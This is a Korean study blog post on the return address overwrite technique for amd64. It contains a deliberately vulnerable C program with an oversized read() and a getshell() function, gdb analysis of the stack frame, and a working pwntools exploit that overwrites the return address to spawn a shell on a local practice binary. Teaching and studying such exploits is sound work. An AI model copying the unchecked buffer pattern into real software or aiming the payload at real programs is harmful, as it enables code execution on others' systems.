---
title: "[PWNABLE]Return Address Overwrite"
description: "※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ 저번 게시글에서 Buffer OverFlow에 대해 간략하게 다뤘다. 이번에는 Stack을 변조하는 것인 Stack Frame에 위치하는 ret 부분을 공격하는 기법에 대해 다루겠다. Stack Frame은 기본적으로 위와 같은 구조를 가지고 있다."
date: "2023-09-18"
translation_key: "tistory-465ad6c4abda"
tags: ["STUDY/PWNABLE_AMD64"]
category: "STUDY/PWNABLE_AMD64"
source_url: "https://whrdud727.tistory.com/entry/PWNABLEReturn-Address-Overwrite"
private: false
---

**※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다.** **※** 

저번 게시글에서 Buffer OverFlow에 대해 간략하게 다뤘다.

이번에는 Stack을 변조하는 것인 Stack Frame에 위치하는 ret 부분을 공격하는 기법에 대해 다루겠다.

![](/assets/images/tistory/tistory-465ad6c4abda/001.png)

Stack Frame은 기본적으로 위와 같은 구조를 가지고 있다.

만약, buf에 데이터 입력하는데 buf보다 더 큰 크기의 데이터를 입력하면 어떻게 될까??

별다른 검증이 없는 프로그램인 이상 sfp와 ret 영역까지 침범하여 입력이 가능해진다.

이런 흐름으로 이뤄지는 공격이 **Return Address Overwrite**이다.

간단한 예제를 하나 생성하여 실습해보겠다.

```
#include <stdio.h>

void getshell(){
    execve("/bin/sh",0,0);
}

int main(){
    int buf[0x30];
    
    printf("Input : ");
    read(0,buf,0x100);

    return 0;
}
```

위 코드는 main()에서 read()를 통해 값을 입력하는 기능만을 수행한다.

이때 주의해서 봐야하는 부분은 2개가 존재한다.

1\. 셸을 실행할 수 있는 getshell()이라는 함수가 존재한다.

2\. main()을 보면 buf배열의 선언된 0x30보다 더 큰 값을 입력할 수 있다.

```
int buf[0x30];
read(0,buf,0x100);
```

위의 코드를 보통 'BOF 취약점이다'라고 한다.

이제 위 코드를 통하여 실습을 진행하겠다.

먼저 buf의 크기를 확인해야한다. 

코드만 보았을 때 일반적으로 0x30이다라고 생각할 수도 있는데,

buf라는 배열은 char이 아닌 int 자료형을 통해 생성이 되었다.

때문에 0x30이 아닌 4 \* 0x30한 결과인 0xc0이 buf의 크기가 된다. 

이렇게 코드를 통해 계산하는 것도 방법이지만 우리는 시스템을 공부하는 입장이니 gdb를 통해 다시 확인하겠다.

![](/assets/images/tistory/tistory-465ad6c4abda/002.png)

우선 main()에서 Stack Frame을 생성하는 부분이다,

우리는 이미 buf의 크기를 알기 때문에 해당 부분이 buf의 크기/위치이다라고 생각할 수 있다.

그래도 우리는 한번 더 확인을 해주어야 한다.

해당 예제는 변수가 1개이고 Stack 보호기법 중 하나인 Canary가 설정되어 있거나

Stack 정렬을 해줄 필요가 없는 것이기 때문에 Stack Frame과 buf가 일치하겠지만,

그렇지 않은 경우가 더 많기 떄문이다.

![](/assets/images/tistory/tistory-465ad6c4abda/003.png)

read()가 호출된 부분을 통해 확인한 결과 buf는 역시 \[rbp-0xc0\]이다.

![](/assets/images/tistory/tistory-465ad6c4abda/004.png)

Stack Frame을 정리하면 위와 같다.

다시 취약점을 살펴보면 buf의 크기인 0xc0보다 큰 0x100 크기의 데이터까지 read()를 통해 입력받는다.

sfp와 ret를 포함한 Stack Frame의 전체 크기는 0xd0이기 때문에 ret부분까지 덮어 씌우는 공격이 가능하다.

이제 어느 함수로 ret할지를 찾으면 되는데 우리는 이미 답을 알고 있다.

셸을 실행시키는 getshell()이라는 함수가 있기 때문이다.

해당 함수의 주소는 gdb를 통해서 확인이 가능하다.

![](/assets/images/tistory/tistory-465ad6c4abda/005.png)

공격 절차를 정리하면 다음과 같다.

1\. buf의 크기 파악

2\. getshell()의 주소 확인

3\. buf + sfp + ret(getshell함수)를 전송

4\. 공격 성공

```
from pwn import*

p = process('./return')
e = ELF('./return')

getshell = e.sym['getshell']

payload = b'a'*0xc0
payload += b'b'*0x8 
payload += p64(getshell)
p.send(payload)

p.interactive()
```

위의 페이로드를 실행하면 정상적으로 공격이 수행된 것을 확인할 수 있다.

![](/assets/images/tistory/tistory-465ad6c4abda/006.png)
